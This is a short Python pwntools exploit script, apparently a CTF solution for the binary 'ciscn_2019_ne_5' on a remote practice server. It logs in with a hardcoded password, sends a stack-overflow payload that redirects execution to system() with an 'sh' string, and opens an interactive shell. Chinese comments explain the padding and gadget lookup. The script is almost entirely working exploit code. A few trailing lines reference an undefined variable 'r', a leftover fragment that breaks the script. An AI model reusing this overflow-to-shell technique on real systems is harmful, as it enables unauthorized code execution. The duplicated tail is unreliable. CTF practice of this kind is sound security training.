
from pwn import*
elf=ELF('./ciscn_2019_ne_5')
p=remote('node4.buuoj.cn',29445)
#p=process('./ciscn_2019_ne_5')
context.log_level='debug'
system=elf.plt['system']
sh_addr=0x80482ea #通过Ropgadget string 获取

p.sendlineafter(b'password:',b'administrator')
p.recvuntil(b'0.Exit\n')
p.sendline(b'1')
payload=b'a'*(0x48+4)+p32(system)+p32(0xdeadbeef)+p32(sh_addr) 
#中间的垃圾字符一定要填满 不然就会以0填充 strcpy复制被截断
p.sendlineafter(b"info:",payload)
p.recvuntil(b'0.Exit\n')
p.sendline(b'4')

p.interactive()

r.recvuntil(b'0.Exit\n:')
r.sendline(b'4')

r.interactive()
